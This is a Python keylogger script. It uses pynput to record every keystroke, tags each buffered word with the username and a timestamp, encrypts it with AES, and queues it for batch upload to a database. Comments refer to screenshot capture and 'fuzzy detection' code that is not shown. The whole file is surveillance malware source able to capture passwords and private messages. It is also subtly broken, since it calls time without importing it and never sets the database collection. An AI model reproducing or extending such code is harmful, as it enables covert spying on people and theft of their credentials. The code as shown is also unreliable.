import atexit
import getpass
import signal
from pynput import keyboard
import threading
import queue
import os
import logging
from datetime import datetime
from base64 import b64encode, b64decode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Hash import SHA256
from Crypto.Random import get_random_bytes

# --- Constants ---
MAX_BUFFER_SIZE = 100
BATCH_SIZE = 50
FLUSH_INTERVAL = 10
QUEUE_FULL_SLEEP = 0.1
QUEUE_EMPTY_SLEEP = 1
HEARTBEAT_INTERVAL = 60

# --- Globals ---
current_buffer = ""
last_flush_time = time.time()
batch = []
keylog_queue = queue.Queue(maxsize=1000)
collection = None  # Will be set later

# --- Helper for user ID ---
def get_username():
    try:
        return os.getlogin()
    except Exception:
        return getpass.getuser()

# --- Key derivation with PBKDF2 and salt ---
def derive_key(passphrase: str, salt: bytes = b'some_fixed_salt_123') -> bytes:
    # Use PBKDF2 with 100k iterations (adjust as needed)
    return PBKDF2(passphrase, salt, dkLen=32, count=100000, hmac_hash_module=SHA256)

# --- Encryption using AES-CBC with random IV ---
def encrypt_data(data: str, key: bytes) -> str:
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    return b64encode(iv + ct_bytes).decode('utf-8')

def decrypt_data(enc_data: str, key: bytes) -> str:
    raw = b64decode(enc_data)
    iv = raw[:AES.block_size]
    ct = raw[AES.block_size:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    pt = unpad(cipher.decrypt(ct), AES.block_size)
    return pt.decode('utf-8')

# --- Buffer flushing function ---
def flush_buffer_to_queue():
    global current_buffer
    if current_buffer:
        current_time = datetime.utcnow()
        log_data = {
            "timestamp": current_time,
            "userId": get_username(),
            "eventType": "keypress",
            "eventData": {
                "key": current_buffer,  # plaintext here before encryption
                "modifiers": [],
                "windowTitle": "N/A"
            }
        }
        try:
            keylog_queue.put(log_data, block=False)
        except queue.Full:
            logging.warning("Keylog queue full, dropping event")
            time.sleep(QUEUE_FULL_SLEEP)
        current_buffer = ""

# --- Key press listener with buffer flush on max size ---
def on_press(key):
    global current_buffer
    try:
        if key in {keyboard.Key.space, keyboard.Key.enter}:
            flush_buffer_to_queue()
        elif key == keyboard.Key.backspace:
            current_buffer = current_buffer[:-1]
        elif hasattr(key, 'char') and key.char is not None:
            current_buffer += key.char
            if len(current_buffer) >= MAX_BUFFER_SIZE:
                flush_buffer_to_queue()
        logging.debug(f"Current buffer: {current_buffer}")
    except AttributeError as e:
        logging.debug(f"Key {key} has no char attribute: {e}")

# --- Graceful shutdown handler ---
def flush_remaining_logs():
    global batch, last_flush_time, collection
    flush_buffer_to_queue()
    if batch:
        try:
            collection.insert_many(batch)
            logging.info(f"Flushed remaining {len(batch)} keylogs on shutdown")
        except Exception as e:
            logging.error(f"Error flushing logs on shutdown: {e}")
    last_flush_time = time.time()

def signal_handler(sig, frame):
    logging.info("Signal received, shutting down gracefully...")
    flush_remaining_logs()
    exit(0)

signal.signal(signal.SIGINT, signal_handler)   # Ctrl+C
signal.signal(signal.SIGTERM, signal_handler)  # Termination signal

atexit.register(flush_remaining_logs)

# --- Usage example for your derived key ---
master_key = os.environ.get("MASTER_KEY")
if not master_key:
    logging.error("Master key missing from env variables. Exiting.")
    exit(1)
derived_master_key = derive_key(master_key)

# Later, in your DB writing thread, do this encryption step:
# keylog_data["eventData"]["key"] = encrypt_data(text_to_check, derived_master_key)

# Rest of your threading, DB insert, fuzzy detection, screenshot etc stays same.

# --- Start keyboard listener ---
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
